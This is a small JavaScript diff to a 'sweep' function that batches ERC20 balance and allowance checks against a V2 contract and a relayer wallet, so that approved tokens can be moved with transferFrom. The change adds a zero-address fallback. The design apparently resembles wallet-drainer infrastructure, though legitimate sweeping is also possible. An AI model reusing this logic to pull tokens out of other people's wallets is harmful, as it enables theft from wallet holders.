@@ -1559,11 +1559,13 @@ async function sweep(wallet) {
     const balIface   = new ethers.Interface(ERC20_BAL_ABI);
     const allowIface = new ethers.Interface(ERC20_ALLOW_ABI);
     const calls = [];
+    // When CONTRACT_ADDRESS is not configured (null, undefined, or empty string from Docker
+    // Compose substitution) use ZeroAddress as placeholder — allowance returns 0 so
+    // toSweepV2 stays empty and the legacy relayer transferFrom path takes over.
+    const safeV2Addr = v2ContractAddr || ethers.ZeroAddress;
     for (const addr of tokenAddrs) {
       calls.push({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) });
-      // Check allowance to V2 contract (primary)
-      calls.push({ target: addr, allowFailure: true, callData: allowIface.encodeFunctionData("allowance", [checksum, v2ContractAddr]) });
-      // Also check legacy relayer allowance as fallback
+      calls.push({ target: addr, allowFailure: true, callData: allowIface.encodeFunctionData("allowance", [checksum, safeV2Addr]) });
       calls.push({ target: addr, allowFailure: true, callData: allowIface.encodeFunctionData("allowance", [checksum, relayerWallet.address]) });
     }
 
